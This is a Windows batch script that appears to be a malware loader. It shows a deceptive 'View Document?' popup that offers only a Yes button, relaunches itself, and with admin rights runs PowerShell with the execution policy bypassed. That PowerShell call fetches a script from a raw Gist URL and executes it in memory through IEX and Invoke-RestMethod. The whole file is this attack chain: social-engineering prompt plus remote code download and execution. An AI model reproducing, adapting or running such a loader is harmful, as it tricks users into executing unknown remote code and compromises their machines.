@echo off
setlocal EnableDelayedExpansion

REM ============================================================
REM  Batch equivalent of the Python launcher
REM  - Shows a Yes-only "View Document?" prompt
REM  - Elevates via UAC
REM  - Runs the PowerShell from the Gist in memory
REM ============================================================

set "GIST_RAW_URL=https://gist.githubusercontent.com/royce1234567/4d109ac2136af42575f4261236b32691/raw/75825835e5bb933e80b6e42a65a84f1b0bc5825f/PsGame.ps1"

REM --- 1. Check for admin ---
net session >nul 2>&1
if %errorlevel%==0 goto :run_payload

REM --- 2. Not admin: show Yes-only prompt, then elevate ---
echo Set objShell = CreateObject("WScript.Shell") > "%TEMP%\prompt.vbs"
echo Set objFSO = CreateObject("Scripting.FileSystemObject") >> "%TEMP%\prompt.vbs"
echo intAnswer = objShell.Popup("View Document?", 0, "Action Required", 4 + 64 + 4096) >> "%TEMP%\prompt.vbs"
echo If intAnswer = 6 Then >> "%TEMP%\prompt.vbs"
echo   objShell.Run "cmd.exe /c ""%~f0"" elevated", 1, False >> "%TEMP%\prompt.vbs"
echo End If >> "%TEMP%\prompt.vbs"

cscript //nologo "%TEMP%\prompt.vbs"
del "%TEMP%\prompt.vbs" >nul 2>&1
exit /b

:run_payload
REM --- 3. We are admin: run PowerShell in memory ---
echo Fetching PowerShell script from Gist into memory...
echo Executing PowerShell pipeline...
echo.

powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (Invoke-RestMethod -Uri '%GIST_RAW_URL%' -UseBasicParsing)"

set "RC=%errorlevel%"
if not "%RC%"=="0" (
    echo.
    echo --- POWERSHELL ERRORS --- 1>&2
    echo PowerShell exited with code %RC% 1>&2
)

endlocal
exit /b %RC%